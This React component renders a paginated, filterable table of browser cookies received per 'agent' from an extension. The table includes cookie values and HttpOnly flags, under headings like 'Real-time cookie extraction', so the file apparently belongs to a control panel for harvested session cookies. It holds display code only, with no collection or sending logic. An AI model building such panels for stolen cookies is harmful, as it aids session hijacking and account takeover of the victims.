
import React, { useState, useEffect } from 'react';
import { useAgentData } from '../../contexts/AgentDataContext';
import LoadingSpinner from '../LoadingSpinner';
import {
  Pagination,
  PaginationContent,
  PaginationEllipsis,
  PaginationItem,
  PaginationLink,
  PaginationNext,
  PaginationPrevious,
} from '../ui/pagination';

interface CookiesProps {
  agentId: string | null;
}

interface Cookie {
  domain: string;
  name: string;
  value: string;
  path: string;
  secure: boolean;
  httpOnly: boolean;
  expires: string;
}

const Cookies: React.FC<CookiesProps> = ({ agentId }) => {
  const { getAgentData, hasError } = useAgentData();
  const [loading, setLoading] = useState(true);
  const [domainFilter, setDomainFilter] = useState('');
  const [currentPage, setCurrentPage] = useState(1);
  const itemsPerPage = 10;

  const cookiesData = agentId ? getAgentData(agentId, 'cookies') : null;
  const error = agentId ? hasError(agentId, 'cookies') : null;

  useEffect(() => {
    if (agentId) {
      setLoading(true);
      const timer = setTimeout(() => setLoading(false), 1000);
      return () => clearTimeout(timer);
    }
  }, [agentId]);

  if (loading) {
    return <LoadingSpinner />;
  }

  if (error) {
    return (
      <div className="p-8">
        <div className="border border-red-400 p-4 bg-red-400/10 mb-6">
          <span className="text-red-400">ERROR:</span> Error loading Cookies: {error}
        </div>
      </div>
    );
  }

  if (!cookiesData || !Array.isArray(cookiesData) || cookiesData.length === 0) {
    return (
      <div className="h-full flex items-center justify-center">
        <div className="text-center">
          <div className="text-green-600 mb-4">
            ╔═══════════════════════════════╗<br />
            ║                               ║<br />
            ║        NO COOKIES DATA        ║<br />
            ║                               ║<br />
            ║   Waiting for extension to    ║<br />
            ║   send cookies data...        ║<br />
            ║                               ║<br />
            ╚═══════════════════════════════╝
          </div>
          <p className="text-green-400 text-sm">← Cookies data pending</p>
        </div>
      </div>
    );
  }

  const filteredCookies = cookiesData.filter((cookie: Cookie) => 
    cookie.domain.toLowerCase().includes(domainFilter.toLowerCase())
  );

  const totalPages = Math.ceil(filteredCookies.length / itemsPerPage);
  const paginatedCookies = filteredCookies.slice(
    (currentPage - 1) * itemsPerPage,
    currentPage * itemsPerPage
  );

  // Логика для отображения пагинации с троеточием
  const renderPaginationItems = () => {
    const items = [];
    const maxVisiblePages = 5;
    
    if (totalPages <= maxVisiblePages) {
      // Показываем все страницы если их мало
      for (let i = 1; i <= totalPages; i++) {
        items.push(
          <PaginationItem key={i}>
            <PaginationLink
              onClick={() => setCurrentPage(i)}
              isActive={currentPage === i}
              className={`cursor-pointer border transition-colors ${
                currentPage === i 
                  ? 'text-black bg-green-400 border-green-400' 
                  : 'text-green-400 border-green-400 hover:bg-green-400/20'
              }`}
            >
              {i}
            </PaginationLink>
          </PaginationItem>
        );
      }
    } else {
      // Показываем первую страницу
      items.push(
        <PaginationItem key={1}>
          <PaginationLink
            onClick={() => setCurrentPage(1)}
            isActive={currentPage === 1}
            className={`cursor-pointer border transition-colors ${
              currentPage === 1 
                ? 'text-black bg-green-400 border-green-400' 
                : 'text-green-400 border-green-400 hover:bg-green-400/20'
            }`}
          >
            1
          </PaginationLink>
        </PaginationItem>
      );

      // Показываем троеточие если нужно
      if (currentPage > 3) {
        items.push(
          <PaginationItem key="ellipsis-start">
            <PaginationEllipsis className="text-green-400" />
          </PaginationItem>
        );
      }

      // Показываем страницы вокруг текущей
      const start = Math.max(2, currentPage - 1);
      const end = Math.min(totalPages - 1, currentPage + 1);
      
      for (let i = start; i <= end; i++) {
        items.push(
          <PaginationItem key={i}>
            <PaginationLink
              onClick={() => setCurrentPage(i)}
              isActive={currentPage === i}
              className={`cursor-pointer border transition-colors ${
                currentPage === i 
                  ? 'text-black bg-green-400 border-green-400' 
                  : 'text-green-400 border-green-400 hover:bg-green-400/20'
              }`}
            >
              {i}
            </PaginationLink>
          </PaginationItem>
        );
      }

      // Показываем троеточие если нужно
      if (currentPage < totalPages - 2) {
        items.push(
          <PaginationItem key="ellipsis-end">
            <PaginationEllipsis className="text-green-400" />
          </PaginationItem>
        );
      }

      // Показываем последнюю страницу
      if (totalPages > 1) {
        items.push(
          <PaginationItem key={totalPages}>
            <PaginationLink
              onClick={() => setCurrentPage(totalPages)}
              isActive={currentPage === totalPages}
              className={`cursor-pointer border transition-colors ${
                currentPage === totalPages 
                  ? 'text-black bg-green-400 border-green-400' 
                  : 'text-green-400 border-green-400 hover:bg-green-400/20'
              }`}
            >
              {totalPages}
            </PaginationLink>
          </PaginationItem>
        );
      }
    }

    return items;
  };

  return (
    <div className="p-8 bg-black text-green-400 font-mono">
      <div className="flex justify-between items-center mb-8">
        <div>
          <h1 className="text-2xl font-bold text-green-400 terminal-text mb-2">
            ┌─[ BROWSER COOKIES ]
          </h1>
          <div className="text-cyan-400 text-sm">
            │ Domain filtering • Session tracking<br />
            └─ Real-time cookie extraction
          </div>
        </div>
        <button className="border border-green-400 text-green-400 px-4 py-2 hover:bg-green-400 hover:text-black transition-colors bg-transparent">
          ► REFRESH
        </button>
      </div>
      
      <div className="flex gap-4 mb-6">
        <input
          type="text"
          placeholder="Filter by domain..."
          value={domainFilter}
          onChange={(e) => setDomainFilter(e.target.value)}
          className="bg-black border border-green-400 text-green-400 px-4 py-2 focus:outline-none focus:border-cyan-400 transition-colors font-mono placeholder-green-600"
        />
        <button 
          onClick={() => setDomainFilter('')}
          className="border border-green-400 text-green-400 px-6 py-2 hover:bg-green-400 hover:text-black transition-colors bg-transparent"
        >
          ► CLEAR
        </button>
      </div>
      
      <div className="border border-green-400 bg-black">
        <div className="bg-green-400 text-black px-4 py-2 font-bold">
          ┌─[ COOKIE DATA TABLE ]
        </div>
        <table className="w-full bg-black">
          <thead className="bg-black border-b border-green-400">
            <tr>
              <th className="text-left px-4 py-3 text-green-400 font-bold border-r border-green-400">DOMAIN</th>
              <th className="text-left px-4 py-3 text-green-400 font-bold border-r border-green-400">NAME</th>
              <th className="text-left px-4 py-3 text-green-400 font-bold border-r border-green-400">VALUE</th>
              <th className="text-left px-4 py-3 text-green-400 font-bold border-r border-green-400">PATH</th>
              <th className="text-left px-4 py-3 text-green-400 font-bold border-r border-green-400">SECURE</th>
              <th className="text-left px-4 py-3 text-green-400 font-bold border-r border-green-400">HTTP_ONLY</th>
              <th className="text-left px-4 py-3 text-green-400 font-bold">EXPIRES</th>
            </tr>
          </thead>
          <tbody>
            {paginatedCookies.map((cookie: Cookie, index: number) => (
              <tr key={index} className="border-b border-green-400 hover:bg-green-400/20">
                <td className="px-4 py-3 text-green-400 border-r border-green-400">{cookie.domain}</td>
                <td className="px-4 py-3 text-green-400 border-r border-green-400">{cookie.name}</td>
                <td className="px-4 py-3 text-green-400 max-w-xs truncate border-r border-green-400">{cookie.value}</td>
                <td className="px-4 py-3 text-green-400 border-r border-green-400">{cookie.path}</td>
                <td className="px-4 py-3 text-green-400 border-r border-green-400">
                  <span className={cookie.secure ? 'text-green-400' : 'text-red-400'}>
                    {cookie.secure ? 'YES' : 'NO'}
                  </span>
                </td>
                <td className="px-4 py-3 text-green-400 border-r border-green-400">
                  <span className={cookie.httpOnly ? 'text-green-400' : 'text-red-400'}>
                    {cookie.httpOnly ? 'YES' : 'NO'}
                  </span>
                </td>
                <td className="px-4 py-3 text-green-400">{cookie.expires || 'Session'}</td>
              </tr>
            ))}
          </tbody>
        </table>
        <div className="bg-green-400 text-black px-4 py-2 text-xs">
          └─[ {filteredCookies.length} COOKIES FOUND • PAGE {currentPage} OF {totalPages} ]
        </div>
      </div>
      
      {totalPages > 1 && (
        <div className="flex justify-center mt-6">
          <Pagination>
            <PaginationContent>
              <PaginationItem>
                <PaginationPrevious 
                  onClick={() => currentPage > 1 && setCurrentPage(currentPage - 1)}
                  className={`cursor-pointer border border-green-400 transition-colors ${
                    currentPage === 1 
                      ? 'opacity-50 cursor-not-allowed text-green-600' 
                      : 'text-green-400 hover:bg-green-400/20'
                  }`}
                />
              </PaginationItem>
              
              {renderPaginationItems()}
              
              <PaginationItem>
                <PaginationNext 
                  onClick={() => currentPage < totalPages && setCurrentPage(currentPage + 1)}
                  className={`cursor-pointer border border-green-400 transition-colors ${
                    currentPage === totalPages 
                      ? 'opacity-50 cursor-not-allowed text-green-600' 
                      : 'text-green-400 hover:bg-green-400/20'
                  }`}
                />
              </PaginationItem>
            </PaginationContent>
          </Pagination>
        </div>
      )}
    </div>
  );
};

export default Cookies;
